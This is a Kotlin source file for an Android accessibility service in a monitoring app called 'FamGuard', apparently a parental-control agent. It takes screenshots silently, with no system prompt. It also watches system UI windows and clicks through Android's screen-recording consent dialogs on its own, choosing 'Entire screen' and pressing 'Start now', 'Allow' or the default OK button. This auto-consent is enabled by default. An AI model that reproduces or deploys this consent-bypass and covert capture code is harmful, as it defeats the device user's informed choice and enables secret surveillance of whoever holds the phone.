package com.famguard.agent.service

import android.accessibilityservice.AccessibilityService
import android.graphics.Bitmap
import android.os.Build
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.annotation.RequiresApi

/**
 * FamGuard Accessibility Service.
 * Provides:
 * 1. Prompt-Free Rapid Screen Capturing (Option 3) via takeScreenshot() (Android 11+).
 * 2. Automatic Consent for MediaProjection Dialogs (Option 1) when needed.
 */
class FamGuardAccessibilityService : AccessibilityService() {

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.i(TAG, "FamGuardAccessibilityService connected and ready.")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (!isAutoConsentEnabled || event == null) return

        val pkgName = event.packageName?.toString() ?: return
        // Common system dialog packages for MediaProjection consent:
        // com.android.systemui, com.google.android.permissioncontroller, etc.
        if (pkgName.contains("systemui", ignoreCase = true) ||
            pkgName.contains("permissioncontroller", ignoreCase = true)
        ) {
            handleSystemConsentDialog()
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "FamGuardAccessibilityService interrupted.")
    }

    override fun onDestroy() {
        super.onDestroy()
        if (instance === this) {
            instance = null
        }
        Log.i(TAG, "FamGuardAccessibilityService destroyed.")
    }

    /**
     * Silently captures the current screen without displaying any system prompts.
     * Supported on Android 11 (API 30) and newer.
     */
    fun captureScreenshot(callback: (Bitmap?) -> Unit) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                takeScreenshot(
                    Display.DEFAULT_DISPLAY,
                    mainExecutor,
                    object : TakeScreenshotCallback {
                        override fun onSuccess(screenshotResult: ScreenshotResult) {
                            try {
                                val hwBuffer = screenshotResult.hardwareBuffer
                                val colorSpace = screenshotResult.colorSpace
                                val hwBitmap = Bitmap.wrapHardwareBuffer(hwBuffer, colorSpace)
                                // Copy to software bitmap so it can be scaled/compressed on background threads
                                val softwareBitmap = hwBitmap?.copy(Bitmap.Config.ARGB_8888, false)
                                hwBuffer.close()
                                callback(softwareBitmap)
                            } catch (e: Exception) {
                                Log.e(TAG, "Error wrapping screenshot buffer: ${e.message}", e)
                                callback(null)
                            }
                        }

                        override fun onFailure(errorCode: Int) {
                            Log.w(TAG, "Accessibility takeScreenshot failed with error code: $errorCode")
                            callback(null)
                        }
                    }
                )
            } catch (e: Exception) {
                Log.e(TAG, "Exception calling takeScreenshot: ${e.message}", e)
                callback(null)
            }
        } else {
            Log.w(TAG, "takeScreenshot requires Android 11 (API 30)+")
            callback(null)
        }
    }

    /**
     * Inspects active window hierarchy and auto-accepts MediaProjection consent prompts
     * (Option 1 behavior for seamless 30fps screen mirror fallback).
     */
    private fun handleSystemConsentDialog() {
        val rootNode = rootInActiveWindow ?: return
        try {
            // First look for dropdown/chip "Entire screen" if Android 14+ displays single-app vs entire screen selector
            val entireScreenNodes = rootNode.findAccessibilityNodeInfosByText("Entire screen")
            if (entireScreenNodes.isNotEmpty()) {
                for (node in entireScreenNodes) {
                    if (node.isClickable) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    } else {
                        node.parent?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    }
                }
            }

            // Click affirmative buttons: "Start now", "Start recording", "Allow", or standard dialog button1
            val affirmativeTexts = listOf("Start now", "Start recording", "Allow", "Start")
            for (text in affirmativeTexts) {
                val nodes = rootNode.findAccessibilityNodeInfosByText(text)
                for (node in nodes) {
                    if (node.isEnabled && (node.isClickable || node.parent?.isClickable == true)) {
                        Log.i(TAG, "Auto-consenting MediaProjection dialog with button text: '$text'")
                        if (node.isClickable) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        } else {
                            node.parent?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        }
                        return
                    }
                }
            }

            // Fallback by ID: android:id/button1 (OK/Start button in standard AlertDialog)
            val button1Nodes = rootNode.findAccessibilityNodeInfosByViewId("android:id/button1")
            for (node in button1Nodes) {
                if (node.isEnabled && node.isClickable) {
                    Log.i(TAG, "Auto-consenting MediaProjection dialog via android:id/button1")
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    return
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error in handleSystemConsentDialog: ${e.message}")
        } finally {
            @Suppress("DEPRECATION")
            rootNode.recycle()
        }
    }

    companion object {
        private const val TAG = "FamGuardAccessibility"

        @Volatile
        var instance: FamGuardAccessibilityService? = null
            private set

        @Volatile
        var isAutoConsentEnabled: Boolean = true

        fun isRunning(): Boolean = instance != null
    }
}
